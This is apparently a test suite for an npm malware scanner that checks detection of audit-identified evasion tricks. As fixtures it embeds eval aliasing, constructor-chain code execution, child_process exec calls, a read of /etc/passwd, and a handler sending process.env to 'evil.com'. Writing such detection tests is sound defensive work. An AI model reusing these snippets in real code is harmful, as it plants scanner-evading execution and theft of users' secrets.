/**
 * Audit v3 bypass fix verification tests
 * Tests for 9 evasion techniques identified in security audit v3.
 * All bypasses must score >= 20 (ADR_THRESHOLD).
 */
const fs = require('fs');
const os = require('os');
const path = require('path');
const { test, asyncTest, assert, runScanDirect, cleanupTemp } = require('../test-utils');

function makeTempPkg(jsContent, fileName = 'index.js') {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-v3-'));
  fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-pkg', version: '1.0.0' }));
  fs.writeFileSync(path.join(tmp, fileName), jsContent);
  return tmp;
}

async function runAuditV3BypassTests() {
  console.log('\n=== AUDIT V3 BYPASS TESTS ===\n');

  // --- Bypass 1: Array destructuring eval alias ---
  await asyncTest('AV3: Array destructuring eval alias detected as CRITICAL', async () => {
    const tmp = makeTempPkg(`const [fn] = [eval];\nfn('require("child_process").exec("whoami")');\n`);
    try {
      const r = await runScanDirect(tmp);
      const t = r.threats.find(t => t.type === 'dangerous_call_eval' && t.severity === 'CRITICAL');
      assert(t, 'Should detect array destructured eval alias with dangerous payload as CRITICAL');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('AV3: Array destructuring eval alias tracked in evalAliases', async () => {
    const tmp = makeTempPkg(`const [fn] = [eval];\nfn('alert(1)');\n`);
    try {
      const r = await runScanDirect(tmp);
      const t = r.threats.find(t => t.type === 'dangerous_call_eval');
      assert(t, 'Should detect indirect eval via array destructuring alias');
    } finally { cleanupTemp(tmp); }
  });

  // --- Bypass 2: AsyncFunction via prototype chain ---
  await asyncTest('AV3: AsyncFunction prototype chain variable → CRITICAL', async () => {
    const tmp = makeTempPkg(`const AF = Object.getPrototypeOf(async function(){}).constructor;\nAF('return 1')();\n`);
    try {
      const r = await runScanDirect(tmp);
      const t = r.threats.find(t => t.type === 'dangerous_constructor' && t.severity === 'CRITICAL');
      assert(t, 'Should detect AsyncFunction constructor extraction as CRITICAL');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('AV3: AsyncFunction prototype chain inline → CRITICAL', async () => {
    const tmp = makeTempPkg(`Object.getPrototypeOf(async function(){}).constructor('return 1')();\n`);
    try {
      const r = await runScanDirect(tmp);
      const t = r.threats.find(t => t.type === 'dangerous_constructor' && t.severity === 'CRITICAL');
      assert(t, 'Should detect inline AsyncFunction constructor as CRITICAL');
    } finally { cleanupTemp(tmp); }
  });

  // --- Bypass 3: Constructor chain traversal ---
  await asyncTest('AV3: Constructor chain [].constructor.constructor → CRITICAL', async () => {
    const tmp = makeTempPkg(`[].constructor.constructor('return process')();\n`);
    try {
      const r = await runScanDirect(tmp);
      const t = r.threats.find(t => t.type === 'dangerous_constructor' && t.severity === 'CRITICAL');
      assert(t, 'Should detect constructor chain traversal as CRITICAL');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('AV3: Constructor chain "".constructor.constructor → CRITICAL', async () => {
    const tmp = makeTempPkg(`"".constructor.constructor('return process')();\n`);
    try {
      const r = await runScanDirect(tmp);
      const t = r.threats.find(t => t.type === 'dangerous_constructor');
      assert(t, 'Should detect string constructor chain traversal');
    } finally { cleanupTemp(tmp); }
  });

  // --- Bypass 4: uncaughtException bulk exfiltration ---
  await asyncTest('AV3: uncaughtException + env + network → CRITICAL compound', async () => {
    const tmp = makeTempPkg(
      `const https = require('https');\n` +
      `process.on('uncaughtException', function(err) {\n` +
      `  const data = JSON.stringify(process.env);\n` +
      `  https.request({hostname:'evil.com',method:'POST'}).end(data);\n` +
      `});\n`
    );
    try {
      const r = await runScanDirect(tmp);
      const t = r.threats.find(t => t.type === 'uncaught_exception_exfil');
      assert(t, 'Should detect uncaughtException exfiltration compound');
      assert(t.severity === 'CRITICAL', 'Should be CRITICAL severity');
    } finally { cleanupTemp(tmp); }
  });

  // --- Bypass 5: dynamic import of child_process → CRITICAL ---
  await asyncTest('AV3: Dynamic import child_process → CRITICAL', async () => {
    const tmp = makeTempPkg(`import('child_process').then(cp => cp.exec('id'));\n`, 'index.mjs');
    try {
      const r = await runScanDirect(tmp);
      const t = r.threats.find(t => t.type === 'dynamic_import');
      assert(t, 'Should detect dynamic import of child_process');
      assert(t.severity === 'CRITICAL', 'Should be CRITICAL for child_process');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('AV3: Dynamic import fs stays HIGH', async () => {
    const tmp = makeTempPkg(`import('fs').then(fs => fs.readFileSync('/etc/passwd'));\n`, 'index.mjs');
    try {
      const r = await runScanDirect(tmp);
      const t = r.threats.find(t => t.type === 'dynamic_import');
      assert(t, 'Should detect dynamic import of fs');
      assert(t.severity === 'HIGH', 'fs should stay HIGH (not elevated to CRITICAL)');
    } finally { cleanupTemp(tmp); }
  });

  // --- Bypass 6: setTimeout string eval with dangerous content → CRITICAL ---
  await asyncTest('AV3: setTimeout with dangerous string → CRITICAL', async () => {
    const tmp = makeTempPkg(`setTimeout("require('child_process').exec('id')", 100);\n`);
    try {
      const r = await runScanDirect(tmp);
      const t = r.threats.find(t => t.type === 'dangerous_call_eval' && t.severity === 'CRITICAL');
      assert(t, 'Should detect setTimeout with dangerous API as CRITICAL');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('AV3: setTimeout with benign string stays HIGH', async () => {
    const tmp = makeTempPkg(`setTimeout("console.log('hello')", 100);\n`);
    try {
      const r = await runScanDirect(tmp);
      const t = r.threats.find(t => t.type === 'dangerous_call_eval');
      assert(t, 'Should detect setTimeout with string');
      assert(t.severity === 'HIGH', 'Benign string should stay HIGH');
    } finally { cleanupTemp(tmp); }
  });

  // --- Bypass 7: vm.runInThisContext with dangerous content → CRITICAL ---
  await asyncTest('AV3: vm.runInThisContext with dangerous string literal → CRITICAL', async () => {
    const tmp = makeTempPkg(`const vm = require('vm');\nvm.runInThisContext("require('child_process').exec('id')");\n`);
    try {
      const r = await runScanDirect(tmp);
      const t = r.threats.find(t => t.type === 'vm_code_execution' && t.severity === 'CRITICAL');
      assert(t, 'Should detect vm.runInThisContext with dangerous API as CRITICAL');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('AV3: vm.runInThisContext with variable containing dangerous code → CRITICAL', async () => {
    const tmp = makeTempPkg(
      `const vm = require('vm');\n` +
      `const code = "require('child_process').exec('whoami')";\n` +
      `vm.runInThisContext(code);\n`
    );
    try {
      const r = await runScanDirect(tmp);
      const t = r.threats.find(t => t.type === 'vm_code_execution' && t.severity === 'CRITICAL');
      assert(t, 'Should resolve variable and detect dangerous vm.runInThisContext as CRITICAL');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('AV3: vm.runInNewContext generic stays HIGH', async () => {
    const tmp = makeTempPkg(`const vm = require('vm');\nvm.runInNewContext(userCode);\n`);
    try {
      const r = await runScanDirect(tmp);
      const t = r.threats.find(t => t.type === 'vm_code_execution');
      assert(t, 'Should detect vm.runInNewContext');
      assert(t.severity === 'HIGH', 'Generic vm code execution should stay HIGH');
    } finally { cleanupTemp(tmp); }
  });

  // --- Negative tests: benign patterns should NOT be elevated ---
  await asyncTest('AV3-NEG: Normal array destructuring (no eval) → no false positive', async () => {
    const tmp = makeTempPkg(`const [a, b] = [1, 2];\nconsole.log(a + b);\n`);
    try {
      const r = await runScanDirect(tmp);
      const t = r.threats.find(t => t.type === 'dangerous_call_eval' || t.type === 'dangerous_call_function');
      assert(!t, 'Normal array destructuring should not trigger eval alias detection');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('AV3-NEG: Constructor on class (not chain) → no false positive', async () => {
    const tmp = makeTempPkg(`class Foo {}\nconst f = new Foo.constructor();\n`);
    try {
      const r = await runScanDirect(tmp);
      const t = r.threats.find(t => t.type === 'dangerous_constructor');
      assert(!t, 'Single .constructor (not chain) should not trigger');
    } finally { cleanupTemp(tmp); }
  });
}

module.exports = runAuditV3BypassTests;
